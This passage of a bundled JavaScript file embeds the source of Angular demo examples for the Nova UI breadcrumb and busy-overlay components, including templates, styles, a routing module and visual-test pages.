<nui-breadcrumb-basic-example></nui-breadcrumb-basic-example>\n</nui-example-wrapper>\n'},76980:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-breadcrumb-docs-example",\n    templateUrl: "./breadcrumb-docs.example.component.html",\n})\nexport class BreadcrumbDocsExampleComponent {\n    public routesExample = `{\n        path: "breadcrumb",\n        component: components.BreadcrumbDocsExampleComponent,\n        data: { breadcrumb: "Root" },\n        children: [\n            {\n                path: "first-subroute",\n                component: components.BreadcrumbFirstSubviewComponent,\n                data: {\n                    breadcrumb: "First Level",\n                    url: "https://spacex.com"\n                },\n                children: [\n                    {\n                        path: "second-subroute",\n                        component: components.BreadcrumbSecondSubviewComponent,\n                        data: { breadcrumb: "Second Level" },\n                    },\n                ],\n            },\n        ],\n    }`;\n}\n'},18772:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-breadcrumb\n    id="nui-demo-breadcrumb-visual-test"\n    [items]="breadcrumbSource"\n    (navigation)="onNavigation($event)"\n></nui-breadcrumb>\n<div class="container">\n    <div>\n        Sed ut perspiciatis, unde omnis iste natus error sit voluptatem\n        accusantium doloremque laudantium, totam rem aperiam eaque ipsa, quae ab\n        illo inventore veritatis et quasi architecto beatae vitae dicta sunt,\n        explicabo. Nemo enim ipsam voluptatem, quia voluptas sit, aspernatur aut\n        odit aut fugit, sed quia consequuntur magni dolores eos, qui ratione\n        voluptatem sequi nesciunt, neque porro quisquam est, qui dolorem ipsum,\n        quia dolor sit, amet, consectetur, adipisci velit, sed quia non numquam\n        eius modi tempora incidunt, ut labore et dolore magnam aliquam quaerat\n        voluptatem.\n    </div>\n    <button\n        id="nui-demo-breadcrumb-show-second-view"\n        (click)="relativeNavigation(\'first-subroute\')"\n    >\n        Show first level\n    </button>\n    <router-outlet></router-outlet>\n</div>\n'},62164:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, OnDestroy, OnInit } from "@angular/core";\nimport { ActivatedRoute, Router } from "@angular/router";\nimport { Subscription } from "rxjs";\n\nimport { BreadcrumbItem, BreadcrumbStateService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-breadcrumb-visual-test",\n    templateUrl: "./breadcrumb-visual-test.component.html",\n})\nexport class BreadcrumbVisualTestComponent implements OnInit, OnDestroy {\n    public breadcrumbSource: Array<BreadcrumbItem>;\n    private routerSubscription: Subscription;\n\n    constructor(\n        private router: Router,\n        private routerState: ActivatedRoute,\n        private breadcrumbStateService: BreadcrumbStateService\n    ) {}\n\n    public ngOnInit(): void {\n        this.breadcrumbSource = this.breadcrumbStateService.getBreadcrumbState(\n            this.routerState\n        );\n        this.routerSubscription = this.breadcrumbStateService\n            .getNavigationSubscription(this.router)\n            .subscribe(\n                () =>\n                    (this.breadcrumbSource =\n                        this.breadcrumbStateService.getBreadcrumbState(\n                            this.routerState\n                        ))\n            );\n    }\n\n    public onNavigation(routerState: string): void {\n        this.router.navigate([routerState]);\n    }\n\n    public relativeNavigation(routerState: string): void {\n        this.router.navigate([routerState], { relativeTo: this.routerState });\n    }\n\n    public ngOnDestroy(): void {\n        this.routerSubscription.unsubscribe();\n    }\n}\n\n@Component({\n    selector: "nui-breadcrumb-first-level",\n    template: ` <div class="container">\n        <div>\n            Et harum quidem rerum facilis est et expedita distinctio. Nam libero\n            tempore, cum soluta nobis est eligendi optio, cumque nihil impedit,\n            quo minus id, quod maxime placeat, facere possimus, omnis voluptas\n            assumenda est, omnis dolor repellendus. Temporibus autem quibusdam\n            et aut officiis debitis aut rerum necessitatibus saepe eveniet, ut\n            et voluptates repudiandae sint et molestiae non recusandae. Itaque\n            earum rerum hic tenetur a sapiente delectus, ut aut reiciendis\n            voluptatibus maiores alias consequatur aut perferendis doloribus\n            asperiores repellat.\n        </div>\n        <button id="nui-demo-breadcrumb-show-third-view" (click)="goNext()">\n            Show second level\n        </button>\n        <router-outlet></router-outlet>\n    </div>`,\n})\nexport class BreadcrumbFirstSubviewLevelComponent {\n    constructor(private router: Router, private routerState: ActivatedRoute) {}\n\n    goNext(): void {\n        this.router.navigate(["second-subroute"], {\n            relativeTo: this.routerState,\n        });\n    }\n}\n\n@Component({\n    selector: "nui-breadcrumb-second-level",\n    template: ` <div>\n        <p>Some data here</p>\n    </div>`,\n})\nexport class BreadcrumbSecondSubviewLevelComponent {}\n'},6747:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiBreadcrumbModule,\n    NuiButtonModule,\n    NuiDocsModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport {\n    BreadcrumbBasicExampleComponent,\n    BreadcrumbCountriesSubviewComponent,\n    BreadcrumbDocsExampleComponent,\n    BreadcrumbFirstSubviewLevelComponent,\n    BreadcrumbOfficesSubviewComponent,\n    BreadcrumbSecondSubviewLevelComponent,\n    BreadcrumbSingleCountryComponent,\n    BreadcrumbVisualTestComponent,\n} from "./index";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: BreadcrumbDocsExampleComponent,\n        data: {\n            breadcrumb: "Root",\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n            showThemeSwitcher: true,\n        },\n        children: [\n            {\n                path: "countries",\n                component: BreadcrumbCountriesSubviewComponent,\n                data: {\n                    breadcrumb: "Countries",\n                    url: "https://tesla.com",\n                    showThemeSwitcher: true,\n                },\n                children: [\n                    {\n                        path: "usa",\n                        component: BreadcrumbSingleCountryComponent,\n                        data: {\n                            breadcrumb: "USA",\n                            showThemeSwitcher: true,\n                        },\n                    },\n                    {\n                        path: "ukraine",\n                        component: BreadcrumbSingleCountryComponent,\n                        data: {\n                            breadcrumb: "Ukraine",\n                            showThemeSwitcher: true,\n                        },\n                    },\n                ],\n            },\n            {\n                path: "offices",\n                component: BreadcrumbOfficesSubviewComponent,\n                data: {\n                    breadcrumb: "Offices",\n                    showThemeSwitcher: true,\n                },\n            },\n        ],\n    },\n    {\n        path: "breadcrumb-visual-test",\n        component: BreadcrumbVisualTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n            breadcrumb: "Root",\n        },\n        children: [\n            {\n                path: "first-subroute",\n                component: BreadcrumbFirstSubviewLevelComponent,\n                data: {\n                    breadcrumb: "First Level",\n                    srlc: {\n                        hideIndicator: true,\n                    },\n                },\n                children: [\n                    {\n                        path: "second-subroute",\n                        component: BreadcrumbSecondSubviewLevelComponent,\n                        data: {\n                            breadcrumb: "Second Level",\n                            srlc: {\n                                hideIndicator: true,\n                            },\n                        },\n                    },\n                ],\n            },\n        ],\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiDocsModule,\n        NuiBreadcrumbModule,\n        NuiButtonModule,\n        RouterModule.forChild(routes),\n    ],\n    declarations: [\n        BreadcrumbDocsExampleComponent,\n        BreadcrumbBasicExampleComponent,\n        BreadcrumbCountriesSubviewComponent,\n        BreadcrumbSingleCountryComponent,\n        BreadcrumbOfficesSubviewComponent,\n        BreadcrumbVisualTestComponent,\n        BreadcrumbFirstSubviewLevelComponent,\n        BreadcrumbSecondSubviewLevelComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("breadcrumb"),\n        },\n    ],\n    exports: [RouterModule],\n})\nclass BreadcrumbModule {}\nexport default BreadcrumbModule;\n'},59298:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./breadcrumb-docs/breadcrumb-docs.example.component";\nexport * from "./breadcrumb-basic/breadcrumb-basic.example.component";\nexport * from "./breadcrumb-visual-test/breadcrumb-visual-test.component";\n'},34638:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div id="nui-demo-busy-host" nui-busy [busy]="busy">\n    <div>\n        <nui-checkbox i18n>\n            Attempts to change my checked state will fail when busy is enabled\n        </nui-checkbox>\n    </div>\n</div>\n\n<button\n    id="nui-demo-busy-button"\n    nui-button\n    type="button"\n    displayStyle="primary"\n    (click)="switchBusy()"\n    i18n\n>\n    Switch busy\n</button>\n'},65886:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t="#nui-demo-busy-host {\n    height: 200px;\n}\n"},31946:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-busy-basic-example",\n    templateUrl: "./busy-basic.example.component.html",\n    styleUrls: ["./busy-basic.example.component.less"],\n})\nexport class BusyBasicExampleComponent {\n    public busy: boolean;\n\n    public switchBusy(): void {\n        this.busy = !this.busy;\n    }\n}\n'},4416:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-message type="warning" [allowDismiss]="false">\n    <strong>Pay Attention!</strong> For proper usage of this component, you may\n    have to import <code>BrowserAnimationsModule</code>.\n</nui-message>\n\n<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code>NuiBusyModule</code>\n    </li>\n</ul>\n\n<h2>Basic Usage</h2>\n<p>\n    To add a busy overlay to some page content, add an\n    <code>nui-busy</code> attribute to the direct parent of the content to be\n    overlaid. By default an\n    <code\n        ><a href="../components/SpinnerComponent.html" target="_blank"\n            >&lt;nui-spinner&gt;</a\n        ></code\n    >\n    component will be placed at the center of the busy overlay.\n    <nui-message [allowDismiss]="false" type="info"\n        >Busy overlay fills the whole area of an element with\n        <code>nui-busy</code> attribute</nui-message\n    >\n</p>\n<nui-example-wrapper filenamePrefix="busy-basic" exampleTitle="Basic Usage">\n    <nui-busy-basic-example></nui-busy-basic-example>\n</nui-example-wrapper>\n\n<h2>Custom Spinner</h2>\n<p>\n    To replace the default\n    <code\n        ><a href="../components/SpinnerComponent.html" target="_blank"\n            >&lt;nui-spinner&gt;</a\n        ></code\n    >\n    component, instantiate your own <code>&lt;nui-spinner&gt;</code> and place\n    it as a direct child of the element that has the\n    <code>nui-busy</code> attribute. You can set any\n    <code>&lt;nui-spinner&gt;</code> inputs to customize it.\n</p>\n<nui-example-wrapper\n    filenamePrefix="busy-spinner"\n    exampleTitle="Custom Spinner"\n>\n    <nui-busy-spinner-example></nui-busy-spinner-example>\n</nui-example-wrapper>\n\n<h2>Custom Progress</h2>\n<p>\n    To replace the default spinner with an\n    <code\n        ><a href="../components/ProgressComponent.html" target="_blank"\n            >&lt;nui-progress&gt;</a\n        ></code\n    >\n    component, instantiate an <code>&lt;nui-progress&gt;</code> and place it as\n    a direct child of the element that has the <code>nui-busy</code> attribute.\n    You can set any <code>&lt;nui-progress&gt;</code> inputs to customize it.\n</p>\n<nui-example-wrapper\n    filenamePrefix="busy-progress"\n    exampleTitle="Custom Progress"\n>\n    <nui-busy-progress-example></nui-busy-progress-example>\n</nui-example-wrapper>\n'},77568:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-busy-docs-example",\n    templateUrl: "./busy-docs.example.component.html",\n})\nexport class BusyDocsExampleComponent {}\n'},34816:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div id="nui-demo-progress-busy" nui-busy [busy]="busy">\n    <div class="busy-content">\n        <nui-checkbox i18n>\n            Attempts to change my checked state will fail when busy is enabled\n        </nui-checkbox>\n    </div>\n    <nui-progress\n        id="nui-demo-progress"\n        i18n-message\n        message="Hello from custom busy"\n    ></nui-progress>\n</div>\n<button\n    id="nui-demo-progress-button"\n    nui-button\n    type="button"\n    displayStyle="primary"\n    (click)="switchBusy()"\n    i18n\n>\n    Switch busy state\n</button>\n'},21624:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=".busy-content {\n    height: 100px;\n}\n"},28768:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-busy-progress-example",\n    templateUrl: "./busy-progress.example.component.html",\n    styleUrls: ["./busy-progress.example.component.less"],\n})\nexport class BusyProgressExampleComponent {\n    public busy: boolean;\n\n    public switchBusy(): void {\n        this.busy = !this.busy;\n    }\n}\n'},81088:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div id="nui-demo-custom-spinner-busy" nui-busy [busy]="busy">\n    <div class="busy-content">\n        <nui-checkbox i18n>\n            Attempts to change my checked state will fail when busy is enabled\n        </nui-checkbox>\n    </div>\n    <nui-spinner\n        id="nui-demo-spinner"\n        size="large"\n        i18n-message\n        message="Hello from custom busy"\n    ></nui-spinner>\n</div>\n<button\n    id="nui-demo-spinner-button"\n    nui-button\n    type="button"\n    displayStyle="primary"\n    (click)="switchBusy()"\n    i18n\n>\n    Switch busy state\n</button>\n'},85688:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=".busy-content {\n    height: 100px;\n}\n"},2688:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-busy-spinner-example",\n    templateUrl: "./busy-spinner.example.component.html",\n    styleUrls: ["./busy-spinner.example.component.less"],\n})\nexport class BusySpinnerExampleComponent {\n    public busy: boolean;\n\n    public switchBusy(): void {\n        this.busy = !this.busy;\n    }\n}\n'},12476:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <div class="row">\n        <div class="col">\n            <h3>Basic small busy</h3>\n            <div id="nui-busy-test-basic" nui-busy [busy]="busy">\n                <div class="test-busy-content">Busy content</div>\n            </div>\n            <hr />\n        </div>\n    </div>\n\n    <div class="row">\n        <div class="col">\n            <h3>Progress busy</h3>\n            <div id="nui-busy-test-progress" nui-busy [busy]="busy">\n                <div class="test-busy-content">Busy content</div>\n                <nui-progress\n                    id="nui-demo-progress"\n                    message="Hello from custom busy"\n                ></nui-progress>\n            </div>\n            <hr />\n        </div>\n    </div>\n\n    <div class="row">\n        <div class="col">\n            <h3>Custom busy</h3>\n            <nui-select\n                class="row justify-content-md-center"\n                id="nui-busy-select-overlay"\n                [appendToBody]="true"\n                [itemsSource]="items"\n            ></nui-select>\n            <div id="nui-busy-test-custom" nui-busy [busy]="busy">\n                <div class="test-busy-content">\n                    <div>Busy content</div>\n                    <div>A bit more content</div>\n                    <div>A bit more content</div>\n                    <div>\n                        A bit more content to overlap with second item in the\n                        select\n                    </div>\n                    <button id="focusable-button-inside-busy-component">\n                        button\n                    </button>\n                    <a href="#">link</a>\n                    <nui-checkbox i18n>\n                        Attempts to change my checked state will fail when busy\n                        is enabled\n                    </nui-checkbox>\n                </div>\n                <nui-spinner\n                    id="nui-demo-spinner"\n                    size="large"\n                    message="Hello from custom busy"\n                ></nui-spinner>\n            </div>\n            <hr />\n        </div>\n    </div>\n\n    <div class="row">\n        <button\n            id="nui-busy-test-button"\n            nui-button\n            type="button"\n            (click)="switchBusy()"\n        >\n            Switch busy state\n        </button>\n    </div>\n</div>\n'},49996:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-busy-test",\n    templateUrl: "./busy-test.component.html",\n})\nexport class BusyTestComponent {\n    public busy: boolean;\n    public items = ["Item 1", "Item 2", "Item 3", "Item 4", "Item 5"];\n\n    public switchBusy(): void {\n        this.busy = !this.busy;\n    }\n}\n'},3668:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <div class="row">\n        <div class="col">\n            <h3>Basic small busy</h3>\n            <div id="nui-busy-test-basic" nui-busy [busy]="busy">\n                <div>Busy content</div>\n                <div>\n                    With any kind of content should have busy indication in the\n                    center of parent container\n                </div>\n            </div>\n            <hr />\n        </div>\n    </div>\n\n    <div class="row">\n        <div class="col">\n            <h3>Custom busy</h3>\n            <div id="nui-busy-test-custom" nui-busy [busy]="busy">\n                <div class="visual-test-busy-content">Busy content</div>\n                <nui-spinner\n                    id="nui-demo-spinner"\n                    size="large"\n                    i18n-message\n                    message="Hello from custom busy"\n                ></nui-spinner>\n            </div>\n            <hr />\n        </div>\n    </div>\n\n    <div class="row">\n        <div class="col">\n            <h3>Progress busy</h3>\n            <div id="nui-busy-test-progress" nui-busy [busy]="busy">\n                <div class="visual-test-busy-content">Busy content</div>\n                <nui-progress\n                    id="nui-demo-progress"\n                    i18n-message\n                    message="Hello from custom busy"\n                ></nui-progress>\n            </div>\n            <hr />\n        </div>\n    </div>\n\n    <div class="row">\n        <div class="col">\n            <h3>Progress busy from the start</h3>\n            <div id="nui-busy-test-progress" nui-busy [busy]="busyAtTheStart">\n                <div class="visual-test-busy-content">Busy content</div>\n                <nui-progress\n                    id="nui-demo-progress"\n                    i18n-message\n                    message="Hello from custom busy"\n                ></nui-progress>\n            </div>\n            <hr />\n        </div>\n    </div>\n\n    <div class="row">\n        <div class="col">\n            <h3>Custom busy</h3>\n            <div id="nui-busy-test-custom" nui-busy [busy]="busyAtTheStart">\n                <div class="visual-test-busy-content">Busy content</div>\n                <nui-spinner\n                    id="nui-demo-spinner"\n                    size="large"\n                    i18n-message\n                    message="Hello from custom busy"\n                ></nui-spinner>\n            </div>\n            <hr />\n        </div>\n    </div>\n\n    <div class="row">\n        <button id="nui-busy-test-button" (click)="switchBusy()">\n            Switch busy state\n        </button>\n    </div>\n</div>\n'},44436:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=".visual-test-busy-content {\n    height: 50px;\n}\n#nui-busy-test-basic {\n    height: 100px;\n}\n"},96852:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-busy-visual",\n    templateUrl: "./busy-visual-test.component.html",\n    styleUrls: ["./busy-visual-test.component.less"],\n})\nexport class BusyVisualTestComponent {\n    public busy: boolean;\n    public busyAtTheStart: boolean = true;\n\n    public switchBusy(): void {\n        this.busy = !this.busy;\n    }\n}\n'},45027:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  